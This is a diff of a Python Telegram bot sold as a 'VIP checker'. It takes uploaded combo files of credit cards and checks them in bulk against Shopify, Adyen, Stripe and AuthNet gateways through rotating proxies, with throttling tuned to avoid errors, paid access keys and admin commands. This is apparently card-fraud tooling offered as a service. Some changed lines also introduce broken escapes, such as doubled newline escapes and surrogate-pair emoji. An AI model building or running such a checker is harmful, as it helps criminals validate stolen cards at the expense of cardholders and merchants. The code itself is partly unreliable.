-                return await styled_reply(update, f"<b>{CE_GEAR} {sf('System Maintenance')}</b>\n\n├ {sf('The bot is currently undergoing upgrades.')}\n╰ {sf('Please try again later.')}", use_gif=True)
+                return await styled_reply(update, f"<b>{CE_GEAR} {sf('System Maintenance')}</b>\n\n├ {sf('The bot is currently undergoing upgrades.')}\\n╰ {sf('Please try again later.')}", use_gif=True)
             if not await force_join_check(update, context): return
             await ensure_user(uid)
             plan = await get_user_plan(uid)
@@ -1176,6 +1427,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for i, p in enumerate(proxies[:30], 1): t += f"<code>{sf(str(i))}.</code> <code>{sf(p['ip'])}:{sf(str(p['port']))}</code>\n"
             if len(proxies) > 30: t += f"\n<i>+{sf(str(len(proxies)-30))} {sf('more...')}</i>"
             await styled_reply(update, t, use_gif=True)
+
         elif cmd == "chkpxy":
             if not await force_join_check(update, context): return
             now = time.time()
@@ -1187,7 +1439,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     secs = int(remaining % 60)
                     return await styled_reply(update,
                         f"<b>{CE_BOOM} {sf('Command Already Used!')}</b>\n\n"
-                        f"├ {sf('You have already used /chkpxy recently.')}\n"
+                        f"├ {sf('You have already used /chkpxy recently.')}\\n"
                         f"╰ {sf('Please wait')} <code>{mins}m {secs}s</code> {sf('before using it again.')}",
                         use_gif=True)
             _CHECKED_USERS_PXY.add(uid)
@@ -1200,14 +1452,19 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"├ <b>{CE_DIAMOND} {sf('Total Proxies')}:</b> <code>{len(proxies)}</code>\n"
                 f"╰ <b>{CE_HOURGLASS} {sf('Testing each proxy via Gateway API...')}</b>",
                 use_gif=True)
+
             dead_proxies = []
             working_count = 0
             checked_count = 0
             total = len(proxies)
+
+            # Use a separate session with safe limits
             connector = aiohttp.TCPConnector(limit=15, ssl=False, enable_cleanup_closed=True, force_close=True)
             test_session = aiohttp.ClientSession(connector=connector)
+
             try:
                 semaphore = asyncio.Semaphore(5)
+
                 async def safe_test_proxy(idx, p_dict):
                     nonlocal working_count, checked_count
                     async with semaphore:
@@ -1220,10 +1477,14 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         except Exception as e:
                             dead_proxies.append((idx, p_dict, f"Exception: {str(e)[:35]}"))
                         checked_count += 1
+
+                # Create tasks with a global timeout wrapper
                 tasks = []
                 for idx, p in enumerate(proxies):
                     task = asyncio.create_task(safe_test_proxy(idx, p))
                     tasks.append(task)
+
+                # Wait with a global timeout (max 3 minutes)
                 try:
                     await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=180)
                 except asyncio.TimeoutError:
@@ -1235,9 +1496,11 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         await asyncio.gather(*tasks, return_exceptions=True)
                     except Exception:
                         pass
+
             except Exception as e:
                 logger.error(f"Proxy check session error: {e}")
             finally:
+                # Always close session properly
                 try:
                     await test_session.close()
                 except Exception:
@@ -1246,6 +1509,8 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await connector.close()
                 except Exception:
                     pass
+
+            # Remove dead proxies
             deleted_count = 0
             for idx, p_dict, reason in sorted(dead_proxies, key=lambda x: x[0], reverse=True):
                 try:
@@ -1253,6 +1518,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     deleted_count += 1
                 except Exception as e:
                     logger.error(f"Failed to remove proxy at index {idx}: {e}")
+
             result_msg = f"""<b>{CE_CROWN} {sf('Proxy Check Complete')} {CE_PARTY}</b>
 
 ├ <b>{CE_DIAMOND} {sf('Total Checked')}:</b> <code>{sf(str(checked_count))}/{sf(str(total))}</code>
@@ -1263,6 +1529,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <i>{sf('Dead proxies have been permanently removed.')}</i>
 <i>{sf('You cannot use /chkpxy again for 1 hour.')}</i>"""
             await styled_edit(tm, result_msg)
+
         elif cmd == "rmpxy":
             if not await force_join_check(update, context): return
             try:
@@ -1272,12 +1539,16 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies to remove.')}</b>", use_gif=True)
             if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Specify all, proxy number, or proxy text.')}</b>\n\n<b>{sf('Examples')}:</b>\n<code>/rmpxy all</code>\n<code>/rmpxy 1</code>\n<code>/rmpxy 209.50.163.241</code>", use_gif=True)
             arg = args[0].strip()
+
+            # Remove ALL
             if arg.lower() == 'all':
                 try:
                     c = await clear_all_proxies(uid)
                     return await styled_reply(update, f"<b>{CE_SMILE} {sf('Cleared')} <code>{sf(str(c))}</code> {sf('Proxies successfully.')}</b>", use_gif=True)
                 except Exception as e:
                     return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Failed to clear')}</b>\n<code>{sf(str(e)[:50])}</code>", use_gif=True)
+
+            # Remove by INDEX
             try:
                 idx = int(arg) - 1
                 if 0 <= idx < len(proxies):
@@ -1290,7 +1561,9 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 else:
                     return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Index out of range.')}</b>\n{sf('Valid range')}: <code>1-{sf(str(len(proxies)))}</code>", use_gif=True)
             except ValueError:
-                pass
+                pass  # Not a number, try text match
+
+            # Remove by TEXT/IP match
             found = False
             for idx, p in enumerate(proxies):
                 proxy_text = p.get('proxy_url', '')
@@ -1301,8 +1574,11 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         return await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy removed')}:</b>\n<code>{sf(proxy_ip)}:{sf(str(p.get('port','?')))}</code>", use_gif=True)
                     except Exception as e:
                         return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Remove failed')}</b>\n<code>{sf(str(e)[:50])}</code>", use_gif=True)
+
+            # Not found
             proxy_list = "\n".join([f"<code>{i+1}. {sf(p.get('ip','?'))}:{sf(str(p.get('port','?')))}</code>" for i, p in enumerate(proxies[:10])])
             await styled_reply(update, f"<b>{CE_CLOWN} {sf('Proxy not found.')}</b>\n\n<b>{sf('Your proxies')}:</b>\n{proxy_list}", use_gif=True)
+
         elif cmd == "gen":
             if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
             if len(args) < 1: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/gen [plan] [qty]</code>", use_gif=True)
@@ -1320,6 +1596,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             t = f"<b>{CE_PARTY} {sf('Successfully Generated')} <code>{sf(str(amt))}</code> {sf('Key(s)!')}</b>\n\n├ <b>{sf('Plan')}:</b> <code>{sf(pi['name'])}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n\n"
             for c in gc: t += f"<code>{sf(c)}</code>\n"
             await styled_reply(update, t, use_gif=True)
+
         elif cmd == "redeem":
             if not await force_join_check(update, context): return
             raw_c = args[0].strip() if args else ""
@@ -1345,6 +1622,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if ADMIN_ID:
                     for admin in ADMIN_ID: await styled_send(context.bot, admin, an, use_gif=True, specific_gif=REDEEM_GIF)
             except Exception: pass
+
         elif cmd == "validate":
             if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
             raw_c = args[0].strip() if args else ""
@@ -1361,6 +1639,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 prof_name = escape_html(_USER_NAMES.get(int(ub), f"User {ub}"))
                 m += f"\n\n├ <b>{CE_SMILE} {sf('Redeemed By')}:</b> <code>{sf(str(ub))}</code> <a href='tg://user?id={ub}'>[{prof_name}]</a>\n╰ <b>{CE_CHART} {sf('Redeem Time')}:</b> <code>{sf(ki.get('redeemed_at', 'Not yet'))}</code>"
             await styled_reply(update, m, use_gif=True)
+
         elif cmd == "maint":
             if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
             a = args[0].strip().lower() if args else ""
@@ -1368,6 +1647,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
             t = "ON" if _MAINTENANCE_MODE else "OFF"
             await styled_reply(update, f"<b>{CE_GEAR} {sf('Maintenance Mode')}:</b> {sf(t)}", use_gif=True)
+
         elif cmd in ["users", "user"]:
             if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
             active_info = []
@@ -1389,6 +1669,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if active_info: text += f"╰ <b>{sf('Currently Checking')}:</b>\n" + "\n".join(active_info)
             else: text += f"╰ <b>{sf('Currently Checking')}:</b> <code>{sf('None')}</code>"
             await styled_reply(update, text, use_gif=True)
+
         elif cmd == "revoke":
             if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
             if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
@@ -1404,8 +1685,10 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await styled_reply(update, admin_msg, use_gif=True)
             try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
             except Exception: pass
+
         else:
             await styled_reply(update, f"<b>{CE_THINK1} {sf('Unknown Command!')}</b>\n\n╰ {sf('Type /start to see available commands.')}", use_gif=True)
+
     except Exception as e:
         logger.error(f"Error handling command {cmd}: {e}")
         await styled_reply(update, f"<b>{CE_CLOWN} {sf('System Error')}</b>\n\n╰ {sf('An unexpected error occurred while processing your request.')}", use_gif=True)
@@ -1432,7 +1715,7 @@ async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     plan = await get_user_plan(uid)
     limit = get_cc_limit(plan, uid)
     admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /chkpxy - {sf('Test Proxies')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
-    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM V2')} {CE_CROWN} ━━━</b>
+    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>
 
 <b>{CE_TOP} {sf('Checker Engine')}:</b>
  ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>
@@ -1472,7 +1755,7 @@ async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     uid = q.from_user.id
     if uid in ADMIN_ID:
-        await q.answer("✅ Admin Access", show_alert=True)
+        await q.answer("\u2705 Admin Access", show_alert=True)
         try: await q.message.delete()
         except: pass
         plan = await get_user_plan(uid)
@@ -1483,13 +1766,13 @@ async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if is_joined:
         await mark_user_joined(uid)
         _JOIN_CACHE[uid] = time.time()
-        await q.answer("✅ Verified Successfully!", show_alert=True)
+        await q.answer("\u2705 Verified Successfully!", show_alert=True)
         try: await q.message.delete()
         except Exception: pass
         plan = await get_user_plan(uid)
         limit = get_cc_limit(plan, uid)
         await send_welcome_menu(context.bot, uid, plan, limit)
-    else: await q.answer("❌ Not joined yet!", show_alert=True)
+    else: await q.answer("\u274c Not joined yet!", show_alert=True)
 
 async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
@@ -1502,10 +1785,9 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
         PENDING_FILES.pop(uid, None)
         return await styled_edit(msg_obj, f"<b>{CE_CLOWN} {sf('Process Cancelled.')}</b>", buttons=None)
     cards = PENDING_FILES.pop(uid, None)
-    if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
+    if not cards: return await q.answer("\u26a0\ufe0f Session expired.", show_alert=True)
     ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
-    workers_val = WORKERS_CONFIG.get(gn)
-    current_workers = workers_val() if callable(workers_val) else workers_val
+    current_workers = 1 if gn == "AuthNet" else WORKERS
     await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(current_workers))}</code>\n├ <b>{CE_FLASH} {sf('CPM Target')}:</b> <code>{sf(str(CPM_TARGET))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
 
@@ -1521,11 +1803,17 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     last_resp = sf("Waiting for response...")
     def is_stopped():
         return process_store.get(uid, {}).get("stopped", False)
-    workers_val = WORKERS_CONFIG.get(gate_name)
-    current_workers = workers_val() if callable(workers_val) else workers_val
+    # Workers config: Shopify=random(15-50), Adyen=20, Stripe=12, AuthNet=1
+    if gate_name == "Shopify":
+        current_workers = random.randint(15, 50)
+    elif gate_name == "Adyen":
+        current_workers = 20
+    elif gate_name == "Stripe":
+        current_workers = 12
+    else:
+        current_workers = 1
     cpm_ctrl = CPMController(CPM_TARGET)
     hit_tasks = []
-    proxy_rotator = ProxyRotator(proxies)
 
     async def dashboard_updater():
         while not is_stopped():
@@ -1577,13 +1865,9 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     break
                 try:
                     await cpm_ctrl.wait()
-                    # Dynamic delay based on gateway
+                    # Sleep between cards - Shopify gets extra delay for accuracy
                     if gate_name == "Shopify":
-                        await asyncio.sleep(2.0)
-                    elif gate_name == "Adyen":
-                        await asyncio.sleep(1.0)
-                    elif gate_name == "Stripe":
-                        await asyncio.sleep(0.8)
+                        await asyncio.sleep(7.0)  # Slower Shopify = less errors
                     else:
                         await asyncio.sleep(5.0)
                     if is_stopped():
@@ -1656,13 +1940,13 @@ async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     key_data = update.callback_query.data
     puid = int(key_data.split(":")[1])
     if update.callback_query.from_user.id != puid and update.callback_query.from_user.id not in ADMIN_ID:
-        return await update.callback_query.answer("⚠️ Not yours!", show_alert=True)
+        return await update.callback_query.answer("\u26a0\ufe0f Not yours!", show_alert=True)
     proc = ACTIVE_MTXT_PROCESSES.get(puid)
     if proc:
         proc["stopped"] = True
         for t in proc.get("tasks", []):
             if not t.done(): t.cancel()
-    await update.callback_query.answer("🛑 Stopped Immediately!", show_alert=True)
+    await update.callback_query.answer("\ud83d\uded1 Stopped Immediately!", show_alert=True)
 
 async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.answer()
@@ -1695,7 +1979,7 @@ def main():
     app.add_handler(CallbackQueryHandler(prompt_redeem_cb, pattern=r"^prompt_redeem$"))
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
-    logger.info("✅ VIP BOT V2 IS FULLY OPERATIONAL WITH ENHANCED CHECK ENGINE!")
+    logger.info("\u2705 VIP BOT  IS FULLY OPERATIONAL WITH CHECK ENGINE!")
     while True:
         try:
             app.run_polling(drop_pending_updates=True)
